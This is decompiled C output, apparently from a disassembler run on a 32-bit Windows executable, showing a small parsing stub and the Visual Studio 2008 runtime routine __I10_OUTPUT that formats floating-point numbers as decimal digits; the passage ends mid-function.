// WARNING: Removing unreachable block (ram,0x0041a3ad)
// WARNING: Removing unreachable block (ram,0x0041a3b0)
// WARNING: Removing unreachable block (ram,0x0041a3b7)
// WARNING: Removing unreachable block (ram,0x0041a3c1)
// WARNING: Removing unreachable block (ram,0x0041a41c)
// WARNING: Removing unreachable block (ram,0x0041a416)
// WARNING: Removing unreachable block (ram,0x0041a422)
// WARNING: Removing unreachable block (ram,0x0041a43f)
// WARNING: Removing unreachable block (ram,0x0041a441)
// WARNING: Removing unreachable block (ram,0x0041a449)
// WARNING: Removing unreachable block (ram,0x0041a44c)
// WARNING: Removing unreachable block (ram,0x0041a451)
// WARNING: Removing unreachable block (ram,0x0041a454)
// WARNING: Removing unreachable block (ram,0x0041a781)
// WARNING: Removing unreachable block (ram,0x0041a45f)
// WARNING: Removing unreachable block (ram,0x0041a798)
// WARNING: Removing unreachable block (ram,0x0041a79f)
// WARNING: Removing unreachable block (ram,0x0041a46a)
// WARNING: Removing unreachable block (ram,0x0041a47d)
// WARNING: Removing unreachable block (ram,0x0041a47f)
// WARNING: Removing unreachable block (ram,0x0041a48c)
// WARNING: Removing unreachable block (ram,0x0041a491)
// WARNING: Removing unreachable block (ram,0x0041a497)
// WARNING: Removing unreachable block (ram,0x0041a4a0)
// WARNING: Removing unreachable block (ram,0x0041a4a7)
// WARNING: Removing unreachable block (ram,0x0041a4bf)
// WARNING: Removing unreachable block (ram,0x0041a4d0)
// WARNING: Removing unreachable block (ram,0x0041a4de)
// WARNING: Removing unreachable block (ram,0x0041a51d)
// WARNING: Removing unreachable block (ram,0x0041a526)
// WARNING: Removing unreachable block (ram,0x0041a73e)
// WARNING: Removing unreachable block (ram,0x0041a534)
// WARNING: Removing unreachable block (ram,0x0041a53e)
// WARNING: Removing unreachable block (ram,0x0041a759)
// WARNING: Removing unreachable block (ram,0x0041a54b)
// WARNING: Removing unreachable block (ram,0x0041a552)
// WARNING: Removing unreachable block (ram,0x0041a55c)
// WARNING: Removing unreachable block (ram,0x0041a561)
// WARNING: Removing unreachable block (ram,0x0041a571)
// WARNING: Removing unreachable block (ram,0x0041a576)
// WARNING: Removing unreachable block (ram,0x0041a580)
// WARNING: Removing unreachable block (ram,0x0041a585)
// WARNING: Removing unreachable block (ram,0x0041a597)
// WARNING: Removing unreachable block (ram,0x0041a5a4)
// WARNING: Removing unreachable block (ram,0x0041a5b3)
// WARNING: Removing unreachable block (ram,0x0041a5c0)
// WARNING: Removing unreachable block (ram,0x0041a5dd)
// WARNING: Removing unreachable block (ram,0x0041a5e1)
// WARNING: Removing unreachable block (ram,0x0041a5e8)
// WARNING: Removing unreachable block (ram,0x0041a5f1)
// WARNING: Removing unreachable block (ram,0x0041a5f4)
// WARNING: Removing unreachable block (ram,0x0041a605)
// WARNING: Removing unreachable block (ram,0x0041a613)
// WARNING: Removing unreachable block (ram,0x0041a61e)
// WARNING: Removing unreachable block (ram,0x0041a625)
// WARNING: Removing unreachable block (ram,0x0041a650)
// WARNING: Removing unreachable block (ram,0x0041a655)
// WARNING: Removing unreachable block (ram,0x0041a660)
// WARNING: Removing unreachable block (ram,0x0041a669)
// WARNING: Removing unreachable block (ram,0x0041a66f)
// WARNING: Removing unreachable block (ram,0x0041a672)
// WARNING: Removing unreachable block (ram,0x0041a698)
// WARNING: Removing unreachable block (ram,0x0041a69d)
// WARNING: Removing unreachable block (ram,0x0041a6a2)
// WARNING: Removing unreachable block (ram,0x0041a6af)
// WARNING: Removing unreachable block (ram,0x0041a6c0)
// WARNING: Removing unreachable block (ram,0x0041a6f1)
// WARNING: Removing unreachable block (ram,0x0041a6c6)
// WARNING: Removing unreachable block (ram,0x0041a6ec)
// WARNING: Removing unreachable block (ram,0x0041a6d0)
// WARNING: Removing unreachable block (ram,0x0041a6e6)
// WARNING: Removing unreachable block (ram,0x0041a6df)
// WARNING: Removing unreachable block (ram,0x0041a6f4)
// WARNING: Removing unreachable block (ram,0x0041a721)
// WARNING: Removing unreachable block (ram,0x0041a6fe)
// WARNING: Removing unreachable block (ram,0x0041a589)
// WARNING: Removing unreachable block (ram,0x0041a566)
// WARNING: Removing unreachable block (ram,0x0041a75c)
// WARNING: Removing unreachable block (ram,0x0041a4a2)
// WARNING: Removing unreachable block (ram,0x0041a766)
// WARNING: Removing unreachable block (ram,0x0041a7a7)

void __cdecl
FUN_0041a105(undefined2 *param_1,char **param_2,char *param_3,int param_4,int param_5,int param_6,
            undefined4 param_7,int param_8)

{
  char cVar1;
  uint uVar2;
  int *piVar3;
  
  uVar2 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (param_8 == 0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    ___security_check_cookie_4(uVar2 ^ (uint)&stack0xfffffffc);
    return;
  }
  for (; (((cVar1 = *param_3, cVar1 == ' ' || (cVar1 == '\t')) || (cVar1 == '\n')) ||
         (cVar1 == '\r')); param_3 = param_3 + 1) {
  }
                    // WARNING: Could not recover jumptable at 0x0041a198. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)PTR_LAB_0041a7cd)();
  return;
}



// WARNING: Removing unreachable block (ram,0x0041ad38)
// WARNING: Removing unreachable block (ram,0x0041ad42)
// WARNING: Removing unreachable block (ram,0x0041ad47)
// Library Function - Single Match
//  _$I10_OUTPUT
// 
// Library: Visual Studio 2008 Release

void __cdecl
__I10_OUTPUT(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  short *psVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  bool bVar6;
  errno_t eVar7;
  ushort *puVar8;
  ushort uVar9;
  ushort uVar10;
  int *piVar11;
  int iVar12;
  ushort uVar13;
  uint uVar14;
  char cVar15;
  uint uVar16;
  short *psVar17;
  short *psVar18;
  ushort uVar19;
  ushort uVar20;
  int iVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  undefined4 *puVar25;
  char *pcVar26;
  ushort *local_70;
  int *local_6c;
  undefined *local_68;
  int local_5c;
  int local_58;
  int local_54;
  short local_50;
  ushort *local_4c;
  int local_48;
  int local_44;
  undefined2 local_40;
  undefined4 uStack_3e;
  ushort uStack_3a;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined local_2c;
  undefined uStack_2b;
  undefined uStack_2a;
  undefined uStack_29;
  undefined4 local_24;
  ushort uStack_20;
  ushort uStack_1e;
  ushort uStack_1c;
  undefined local_1a;
  byte bStack_19;
  byte local_14;
  undefined uStack_13;
  ushort uStack_12;
  undefined4 local_10;
  ushort local_c;
  ushort uStack_a;
  uint local_8;
  
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  iVar4 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_14 = (byte)param_1;
  uStack_13 = (undefined)((uint)param_1 >> 8);
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_10._0_2_ = (ushort)param_2;
  iVar21 = CONCAT22((ushort)local_10,uStack_12);
  local_10._2_2_ = (ushort)(param_2 >> 0x10);
  local_c = param_3;
  uVar9 = param_3 & 0x8000;
  uVar14 = param_3 & 0x7fff;
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c = 0xcc;
  uStack_2b = 0xcc;
  uStack_2a = 0xfb;
  uStack_29 = 0x3f;
  if (uVar9 == 0) {
    *(undefined *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined *)(param_6 + 1) = 0x2d;
  }
  if ((((short)uVar14 == 0) && (param_2 == 0)) && (param_1 == 0)) {
    *param_6 = 0;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)((int)param_6 + 3) = 1;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
    iVar2 = iVar4;
    goto LAB_0041b0d5;
  }
  if ((short)uVar14 == 0x7fff) {
    *param_6 = 1;
    if (((param_2 == 0x80000000) && (param_1 == 0)) || ((param_2 & 0x40000000) != 0)) {
      if ((uVar9 == 0) || (param_2 != 0xc0000000)) {
        if ((param_2 != 0x80000000) || (param_1 != 0)) goto LAB_0041a933;
        pcVar26 = s_1_INF_00420098;
      }
      else {
        if (param_1 != 0) {
LAB_0041a933:
          pcVar26 = s_1_QNAN_00420090;
          goto LAB_0041a938;
        }
        pcVar26 = s_1_IND_004200a0;
      }
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 5;
    }
    else {
      pcVar26 = s_1_SNAN_004200a8;
LAB_0041a938:
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 6;
    }
    param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
    goto LAB_0041b0d5;
  }
  local_50 = (short)(((uVar14 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar14 * 0x4d10
                    >> 0x10);
  uVar16 = (uint)local_50;
  local_24._0_2_ = 0;
  local_1a = (undefined)uVar14;
  bStack_19 = (byte)(uVar14 >> 8);
  uStack_1e = (ushort)local_10;
  uStack_1c = local_10._2_2_;
  local_24._2_2_ = (ushort)param_1;
  local_68 = &LAB_00423650;
  uStack_20 = uStack_12;
  if (-uVar16 != 0) {
    iVar5 = param_1;
    uVar14 = -uVar16;
    iVar2 = iVar4;
    if (0 < (int)uVar16) {
      local_68 = &DAT_004237b0;
      uVar14 = uVar16;
    }
    while (uVar14 != 0) {
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      iVar4 = CONCAT22(local_c,local_10._2_2_);
      local_68 = local_68 + 0x54;
      if ((uVar14 & 7) != 0) {
        piVar11 = (int *)(local_68 + (uVar14 & 7) * 0xc);
        if (0x7fff < *(ushort *)piVar11) {
          local_40 = (undefined2)*piVar11;
          uStack_3e._0_2_ = (undefined2)((uint)*piVar11 >> 0x10);
          piVar3 = piVar11 + 2;
          uStack_3e._2_2_ = (undefined2)piVar11[1];
          uStack_3a = (ushort)((uint)piVar11[1] >> 0x10);
          piVar11 = (int *)&local_40;
          local_38 = *piVar3;
          iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e) + -1;
          uStack_3e._0_2_ = (undefined2)iVar2;
          uStack_3e._2_2_ = (undefined2)((uint)iVar2 >> 0x10);
        }
        local_58 = 0;
        local_14 = 0;
        uStack_13 = 0;
        uStack_12 = 0;
        local_10._0_2_ = 0;
        iVar21 = 0;
        local_10._2_2_ = 0;
        local_c = 0;
        iVar4 = 0;
        uStack_a = 0;
        uVar19 = (*(ushort *)((int)piVar11 + 10) ^ CONCAT11(bStack_19,local_1a)) & 0x8000;
        uVar10 = CONCAT11(bStack_19,local_1a) & 0x7fff;
        uVar13 = *(ushort *)((int)piVar11 + 10) & 0x7fff;
        uVar20 = uVar13 + uVar10;
        if (((uVar10 < 0x7fff) && (uVar13 < 0x7fff)) && (uVar20 < 0xbffe)) {
          if (0x3fbf < uVar20) {
            if (((uVar10 == 0) &&
                (uVar20 = uVar20 + 1,
                (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
               ((CONCAT22(uStack_1e,uStack_20) == 0 &&
                (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)))) {
              local_1a = 0;
              bStack_19 = 0;
              goto LAB_0041ac49;
            }
            if ((((uVar13 == 0) && (uVar20 = uVar20 + 1, (piVar11[2] & 0x7fffffffU) == 0)) &&
                (piVar11[1] == 0)) && (*piVar11 == 0)) goto LAB_0041aa68;
            local_5c = 0;
            puVar25 = &local_10;
            local_44 = 5;
            do {
              local_54 = local_44;
              if (0 < local_44) {
                local_70 = (ushort *)((int)&local_24 + local_5c * 2);
                local_6c = piVar11 + 2;
                do {
                  bVar6 = false;
                  uVar16 = puVar25[-1] + (uint)*local_70 * (uint)*(ushort *)local_6c;
                  if ((uVar16 < (uint)puVar25[-1]) ||
                     (uVar16 < (uint)*local_70 * (uint)*(ushort *)local_6c)) {
                    bVar6 = true;
                  }
                  puVar25[-1] = uVar16;
                  if (bVar6) {
                    *(short *)puVar25 = *(short *)puVar25 + 1;
                  }
                  local_70 = local_70 + 1;
                  local_6c = (int *)((int)local_6c + -2);
                  local_54 = local_54 + -1;
                } while (0 < local_54);
              }
              puVar25 = (undefined4 *)((int)puVar25 + 2);
              local_5c = local_5c + 1;
              local_44 = local_44 + -1;
            } while (0 < local_44);
            uVar20 = uVar20 + 0xc002;
            if ((short)uVar20 < 1) {
LAB_0041ab79:
              uVar20 = uVar20 - 1;
              if ((short)uVar20 < 0) {
                uVar16 = (uint)(ushort)-uVar20;
                uVar20 = 0;
                do {
                  if ((local_14 & 1) != 0) {
                    local_58 = local_58 + 1;
                  }
                  iVar4 = CONCAT22(uStack_a,local_c);
                  uVar22 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
                  uStack_a = uStack_a >> 1;
                  local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
                  uVar23 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
                  uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
                  uVar16 = uVar16 - 1;
                  local_10._0_2_ = (ushort)(uVar22 >> 1);
                  local_14 = (byte)uVar23;
                  uStack_13 = (undefined)(uVar23 >> 8);
                } while (uVar16 != 0);
                if (local_58 != 0) {
                  local_14 = local_14 | 1;
                }
              }
            }
            else {
              do {
                uVar13 = local_10._2_2_;
                uVar10 = uStack_12;
                if ((uStack_a & 0x8000) != 0) break;
                iVar21 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
                local_14 = (byte)iVar21;
                uStack_13 = (undefined)((uint)iVar21 >> 8);
                uStack_12 = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
                local_10._0_2_ = (ushort)iVar21 | uVar10 >> 0xf;
                local_10._2_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(uStack_a,local_c) * 2;
                local_c = (ushort)iVar21 | uVar13 >> 0xf;
                uVar20 = uVar20 - 1;
                uStack_a = (ushort)((uint)iVar21 >> 0x10);
              } while (0 < (short)uVar20);
              if ((short)uVar20 < 1) goto LAB_0041ab79;
            }
            if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
               (iVar4 = CONCAT22(local_c,local_10._2_2_),
               iVar21 = CONCAT22((ushort)local_10,uStack_12),
               (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
              if (CONCAT22((ushort)local_10,uStack_12) == -1) {
                uStack_12 = 0;
                local_10._0_2_ = 0;
                iVar21 = 0;
                if (CONCAT22(local_c,local_10._2_2_) == -1) {
                  local_10._2_2_ = 0;
                  local_c = 0;
                  if (uStack_a == 0xffff) {
                    uStack_a = 0x8000;
                    uVar20 = uVar20 + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                  else {
                    uStack_a = uStack_a + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                }
                else {
                  iVar4 = CONCAT22(local_c,local_10._2_2_) + 1;
                  local_10._2_2_ = (ushort)iVar4;
                  local_c = (ushort)((uint)iVar4 >> 0x10);
                }
              }
              else {
                iVar21 = CONCAT22((ushort)local_10,uStack_12) + 1;
                uStack_12 = (ushort)iVar21;
                local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar4 = CONCAT22(local_c,local_10._2_2_);
              }
            }
            local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
            uStack_12 = (ushort)iVar21;
            local_c = (ushort)((uint)iVar4 >> 0x10);
            local_10._2_2_ = (ushort)iVar4;
            if (uVar20 < 0x7fff) {
              bStack_19 = (byte)(uVar20 >> 8) | (byte)(uVar19 >> 8);
              local_24._0_2_ = uStack_12;
              local_24._2_2_ = (ushort)local_10;
              uStack_20 = local_10._2_2_;
              iVar5 = CONCAT22(local_10._2_2_,(ushort)local_10);
              uStack_1e = local_c;
              uStack_1c = uStack_a;
              local_1a = (undefined)uVar20;
            }
            else {
              uStack_20 = 0;
              uStack_1e = 0;
              local_24._0_2_ = 0;
              local_24._2_2_ = 0;
              iVar5 = 0;
              iVar12 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
              uStack_1c = (ushort)iVar12;
              local_1a = (undefined)((uint)iVar12 >> 0x10);
              bStack_19 = (byte)((uint)iVar12 >> 0x18);
            }
            goto LAB_0041ac49;
          }
LAB_0041aa68:
          uStack_1c = 0;
          local_1a = 0;
          bStack_19 = 0;
        }
        else {
          iVar21 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
        }
        uStack_20 = 0;
        uStack_1e = 0;
        local_24._0_2_ = 0;
        local_24._2_2_ = 0;
        iVar5 = 0;
        iVar21 = 0;
        iVar4 = 0;
      }
LAB_0041ac49:
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      local_c = (ushort)((uint)iVar4 >> 0x10);
      local_10._2_2_ = (ushort)iVar4;
      local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
      uStack_12 = (ushort)iVar21;
      param_1 = CONCAT22(uStack_12,local_24._2_2_);
      param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
      uVar14 = (int)uVar14 >> 3;
    }
  }
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  if (0x3ffe < (ushort)(uVar14 >> 0x10)) {
    local_50 = local_50 + 1;
    local_54 = 0;
    local_14 = 0;
    uStack_13 = 0;
    uStack_12 = 0;
    local_10._0_2_ = 0;
    local_10._2_2_ = 0;
    local_c = 0;
    uStack_a = 0;
    uVar16 = uVar14 >> 0x10 & 0x7fff;
    iVar21 = uVar16 + 0x3ffb;
    if (((ushort)uVar16 < 0x7fff) && ((ushort)iVar21 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar21) {
        if (((((ushort)uVar16 == 0) &&
             (iVar21 = uVar16 + 0x3ffc,
             (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
            (CONCAT22(uStack_1e,uStack_20) == 0)) &&
           (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)) {
          local_1a = 0;
          bStack_19 = 0;
          param_2 = 0;
          uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
          goto LAB_0041af0d;
        }
        local_5c = 0;
        puVar25 = &local_10;
        local_44 = 5;
        do {
          local_58 = local_44;
          if (0 < local_44) {
            local_4c = (ushort *)&local_2c;
            puVar8 = (ushort *)((int)&local_24 + local_5c * 2);
            do {
              bVar6 = false;
              uVar16 = puVar25[-1] + (uint)*local_4c * (uint)*puVar8;
              if ((uVar16 < (uint)puVar25[-1]) || (uVar16 < (uint)*local_4c * (uint)*puVar8)) {
                bVar6 = true;
              }
              puVar25[-1] = uVar16;
              if (bVar6) {
                *(short *)puVar25 = *(short *)puVar25 + 1;
              }
              local_4c = local_4c + -1;
              puVar8 = puVar8 + 1;
              local_58 = local_58 + -1;
            } while (0 < local_58);
          }
          puVar25 = (undefined4 *)((int)puVar25 + 2);
          local_5c = local_5c + 1;
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar21 = iVar21 + 0xc002;
        if ((short)iVar21 < 1) {
LAB_0041ae06:
          uVar20 = (ushort)(iVar21 + 0xffff);
          if ((short)uVar20 < 0) {
            uVar16 = -(iVar21 + 0xffff);
            uVar14 = uVar16 & 0xffff;
            uVar20 = uVar20 + (short)uVar16;
            do {
              if ((local_14 & 1) != 0) {
                local_54 = local_54 + 1;
              }
              iVar4 = CONCAT22(uStack_a,local_c);
              uVar16 = CONCAT22(local_10._2_2_,(ushort)local_10);
              iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
              local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
              uStack_a = uStack_a >> 1;
              local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
              uVar22 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
              uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
              uVar14 = uVar14 - 1;
              local_10._0_2_ = (ushort)(uVar16 >> 1);
              local_14 = (byte)uVar22;
              uStack_13 = (undefined)(uVar22 >> 8);
            } while (uVar14 != 0);
            if (local_54 != 0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar10 = local_10._2_2_;
            uVar20 = uStack_12;
            if ((short)uStack_a < 0) break;
            iVar4 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
            local_14 = (byte)iVar4;
            uStack_13 = (undefined)((uint)iVar4 >> 8);
            uStack_12 = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
            local_10._0_2_ = (ushort)iVar4 | uVar20 >> 0xf;
            local_10._2_2_ = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(uStack_a,local_c) * 2;
            local_c = (ushort)iVar4 | uVar10 >> 0xf;
            iVar21 = iVar21 + 0xffff;
            uStack_a = (ushort)((uint)iVar4 >> 0x10);
          } while (0 < (short)iVar21);
          uVar20 = (ushort)iVar21;
          if ((short)uVar20 < 1) goto LAB_0041ae06;
        }
        if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
           (iVar21 = CONCAT22(local_c,local_10._2_2_), uVar16 = CONCAT22((ushort)local_10,uStack_12)
           , (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22((ushort)local_10,uStack_12) == -1) {
            uVar16 = 0;
            if (CONCAT22(local_c,local_10._2_2_) == -1) {
              if (uStack_a == 0xffff) {
                uStack_a = 0x8000;
                uVar20 = uVar20 + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
              else {
                uStack_a = uStack_a + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
            }
            else {
              iVar21 = CONCAT22(local_c,local_10._2_2_) + 1;
            }
          }
          else {
            uVar16 = CONCAT22((ushort)local_10,uStack_12) + 1;
            iVar21 = CONCAT22(local_c,local_10._2_2_);
          }
        }
        local_10._0_2_ = (ushort)(uVar16 >> 0x10);
        uStack_12 = (ushort)uVar16;
        local_c = (ushort)((uint)iVar21 >> 0x10);
        local_10._2_2_ = (ushort)iVar21;
        param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        if (uVar20 < 0x7fff) {
          bStack_19 = (byte)(uVar20 >> 8) | bStack_19 & 0x80;
          uStack_20 = local_10._2_2_;
          uStack_1e = local_c;
          uStack_1c = uStack_a;
          local_1a = (undefined)uVar20;
        }
        else {
          uStack_20 = 0;
          uStack_1e = 0;
          uVar16 = 0;
          iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
          param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        }
        goto LAB_0041af0d;
      }
      iVar21 = 0;
    }
    else {
      iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
    }
    uStack_1e = 0;
    uStack_20 = 0;
    uStack_1c = (ushort)iVar21;
    local_1a = (undefined)((uint)iVar21 >> 0x10);
    bStack_19 = (byte)((uint)iVar21 >> 0x18);
    param_2 = 0;
    uVar16 = 0;
  }
LAB_0041af0d:
  *param_6 = local_50;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar21 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 0x10) - 0x3ffe;
    local_1a = 0;
    bStack_19 = 0;
    local_48 = 8;
    uVar14 = uVar16;
    do {
      uVar16 = uVar14 << 1;
      iVar4 = CONCAT22(uStack_1e,uStack_20) * 2;
      uStack_20 = (ushort)iVar4 | (ushort)(uVar14 >> 0x1f);
      iVar5 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2;
      uStack_1c = (ushort)iVar5 | uStack_1e >> 0xf;
      local_48 = local_48 + -1;
      uStack_1e = (ushort)((uint)iVar4 >> 0x10);
      local_1a = (undefined)((uint)iVar5 >> 0x10);
      bStack_19 = (byte)((uint)iVar5 >> 0x18);
      uVar14 = uVar16;
    } while (local_48 != 0);
    if ((iVar21 < 0) && (uVar22 = -iVar21 & 0xff, uVar22 != 0)) {
      do {
        iVar4 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
        uVar23 = CONCAT22(uStack_1e,uStack_20);
        iVar21 = CONCAT22(uStack_1e,uStack_20);
        uVar16 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 1;
        uStack_1c = (ushort)uVar16;
        local_1a = (undefined)(uVar16 >> 0x10);
        bStack_19 = bStack_19 >> 1;
        uStack_1e = uStack_1e >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
        uVar16 = uVar14 >> 1 | iVar21 << 0x1f;
        uVar22 = uVar22 - 1;
        uStack_20 = (ushort)(uVar23 >> 1);
        local_24._0_2_ = (undefined2)(uVar14 >> 1);
        local_24._2_2_ = (ushort)(uVar16 >> 0x10);
        uVar14 = CONCAT22(local_24._2_2_,(undefined2)local_24);
      } while (0 < (int)uVar22);
    }
    psVar1 = param_6 + 2;
    psVar17 = psVar1;
    uVar20 = uStack_1e;
    for (iVar21 = param_4 + 1; 0 < iVar21; iVar21 = iVar21 + -1) {
      local_24._2_2_ = (ushort)(uVar16 >> 0x10);
      local_24._0_2_ = (undefined2)uVar16;
      iVar2 = CONCAT22(uStack_20,local_24._2_2_);
      local_38 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
      uVar14 = CONCAT22(uVar20,uStack_20) * 2;
      uVar22 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2 | (uint)(uVar20 >> 0xf)) * 2 |
               uVar14 >> 0x1f;
      uVar23 = (uVar14 | local_24._2_2_ >> 0xf) * 2 | (uVar16 << 1) >> 0x1f;
      uVar14 = uVar16 * 5;
      if ((uVar14 < uVar16 * 4) || (uVar24 = uVar23, uVar14 < uVar16)) {
        uVar24 = uVar23 + 1;
        bVar6 = false;
        if ((uVar24 < uVar23) || (uVar24 == 0)) {
          bVar6 = true;
        }
        if (bVar6) {
          uVar22 = uVar22 + 1;
        }
      }
      uVar23 = CONCAT22(uVar20,uStack_20) + uVar24;
      if ((uVar23 < uVar24) || (uVar23 < CONCAT22(uVar20,uStack_20))) {
        uVar22 = uVar22 + 1;
      }
      iVar4 = (uVar22 + local_38) * 2;
      uStack_1c = (ushort)iVar4 | (ushort)(uVar23 >> 0x1f);
      uVar16 = uVar16 * 10;
      local_1a = (undefined)((uint)iVar4 >> 0x10);
      uStack_20 = (ushort)(uVar23 * 2) | (ushort)(uVar14 >> 0x1f);
      *(char *)psVar17 = (char)((uint)iVar4 >> 0x18) + '0';
      psVar17 = (short *)((int)psVar17 + 1);
      uStack_1e = (ushort)(uVar23 * 2 >> 0x10);
      bStack_19 = 0;
      local_40 = (undefined2)local_24;
      uStack_3a = uVar20;
      uVar20 = uStack_1e;
    }
    psVar18 = psVar17 + -1;
    uStack_1e = uVar20;
    if (*(char *)((int)psVar17 + -1) < '5') {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '0'));
          psVar18 = (short *)((int)psVar18 + -1)) {
      }
      if (psVar18 < psVar1) {
        *param_6 = 0;
        *(undefined *)((int)param_6 + 3) = 1;
        *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
        *(char *)psVar1 = '0';
        *(undefined *)((int)param_6 + 5) = 0;
        goto LAB_0041b0d5;
      }
    }
    else {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '9'));
          psVar18 = (short *)((int)psVar18 + -1)) {
        *(char *)psVar18 = '0';
      }
      if (psVar18 < psVar1) {
        psVar18 = (short *)((int)psVar18 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar18 = *(char *)psVar18 + '\x01';
    }
    cVar15 = ((char)psVar18 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar15;
